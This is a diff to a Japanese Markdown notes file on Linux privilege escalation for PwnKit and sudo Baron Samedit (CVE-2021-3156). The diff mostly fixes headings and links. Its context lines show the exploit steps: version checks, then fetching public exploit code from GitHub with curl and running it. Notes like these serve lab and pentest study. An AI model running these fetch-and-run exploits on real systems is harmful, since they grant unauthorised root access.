@@ -632,7 +632,7 @@ ls -l /usr/bin/pkexec
 ```zsh
 dpkg -s policykit-1 | grep Version
 ```
-→出力を[💥Linux Privilege Escalation](#ディストロごとの%20vulnerable%20/%20fixed%20バージョン)と照合する。
+→出力を[ディストロごとのvulnerable / fixed バージョン(PwnKit)](#ディストロごとのvulnerable%20/%20fixed%20バージョン(PwnKit))と照合する。
 
 3. 脆弱なバージョンであれば、エクスプロイトの実行
 ```zsh
@@ -643,7 +643,7 @@ chmod +x pwnkit
 ```
 実行後、もしシステムがすでに修正済みであれば「失敗しました」と明示的に通知される
 
-#### ディストロごとの vulnerable / fixed バージョン
+#### ディストロごとのvulnerable / fixed バージョン(PwnKit)
 
 - 🔗参照：[The PwnKit vulnerability: Overview, detection, and remediation](https://www.datadoghq.com/blog/pwnkit-vulnerability-overview-and-remediation/)
 
@@ -751,7 +751,7 @@ searchsploit -m 50011
 
 ### sudo Baron Samedit (CVE-2021-3156)
 
-https://github.com/worawit/CVE-2021-3156
+🔗[CVE-2021-3156](https://github.com/worawit/CVE-2021-3156)
 
 1. sudo のバージョン確認
 ```sh
@@ -767,7 +767,7 @@ dpkg -l sudo
 # RHEL / CentOS / Fedora の場合
 rpm -qa | grep sudo
 ```
-- → 出力を[💥Linux Privilege Escalation](#ディストロごとのvulnerable%20/%20fixed%20バージョン)と照合
+- → 出力を[ディストロごとのvulnerable / fixed バージョン(sudo Baron Samedit)](#ディストロごとのvulnerable%20/%20fixed%20バージョン(sudo%20Baron%20Samedit))と照合
 
 3. exploit の実行
 ```sh
@@ -776,10 +776,10 @@ curl -fsSL https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_
 python3 exploit_nss.py
 ```
 
-#### ディストロごとのvulnerable / fixed バージョン
+#### ディストロごとのvulnerable / fixed バージョン(sudo Baron Samedit)
 
 🔗参照：  
-https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow.txt
+[https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow.txt](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt)
 
 | Ubuntu version | Vulnerable          | Fixed               |
 | -------------- | ------------------- | ------------------- |
